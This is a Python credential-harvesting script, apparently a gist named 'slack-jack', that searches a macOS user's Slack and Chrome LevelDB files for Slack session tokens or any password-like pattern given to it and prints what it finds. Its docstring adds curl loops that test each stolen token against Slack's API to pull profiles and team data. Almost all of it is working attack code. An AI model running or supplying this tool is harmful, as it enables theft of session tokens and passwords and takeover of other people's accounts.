#!/usr/bin/env python

##
## https://gist.github.com/thesubtlety/a1c460d53df0837c5817c478b9f10588
##

'''
Just a python re-write of a tool by akerl
https://blog.akerl.org/2018/03/15/stealing-slack-creds-from-chrome/
https://github.com/akerl/limp
# user profiles
for tok in $(python3 slack-jack.py); do echo "Trying $tok"; curl -s https://slack.com/api/users.profile.get\?token\=$tok -H'Content-Type: application/x-www-form-urlencoded' | jq ; done
# teams
for tok in $(python3 slack-jack.py); do echo "Trying $tok"; curl -s https://slack.com/api/users.profile.get\?token\=$tok -H'Content-Type: application/x-www-form-urlencoded' | jq -r '.enterprise_user.teams[]; done
curl -s https://slack.com/api/team.info\?team\=$team\&token=$tok -H'Content-Type: application/x-www-form-urlencoded' | jq
Usage:
	python3 slack-jack.py
	python3 slack-jack.py "password.{1,50}"
'''

import os
import re
import sys

def find_tokens(file, token_regex):
	with open(file, mode='rb') as f:
		dbf = f.read()
	tokens = re.findall(token_regex, dbf)
	return tokens

def main():
	token_regex = re.compile(b'xoxs-\d+-\d+-\d+-[a-fA-F\d]+')

	if len(sys.argv) > 1:
		token_regex = re.compile(b'%s' % sys.argv[1].encode())

	user_dir = os.getlogin()
	# find ~/Library/Application\ Support/Slack/ -name \*.ldb
	dirs = ['/Users/%s/Library/Application Support/Slack/' % user_dir, '/Users/%s/Library/Application Support/Google/Chrome/' % user_dir]
	
	ldb_files = []
	for d in dirs:
		for root, dirs, files in os.walk(d):
			for name in files:
				if ".ldb" in name:
					ldb_files.append(os.path.join(root, name))

	tokens = []
	for file in ldb_files:
		tokens += find_tokens(file, token_regex)

	for t in list(set(tokens)):
		if t:
			try:
				print(t.decode('utf-8'))
			except UnicodeDecodeError:
				print(t.decode('latin-1'))

if __name__ == "__main__":
	main()
  
  
##
##
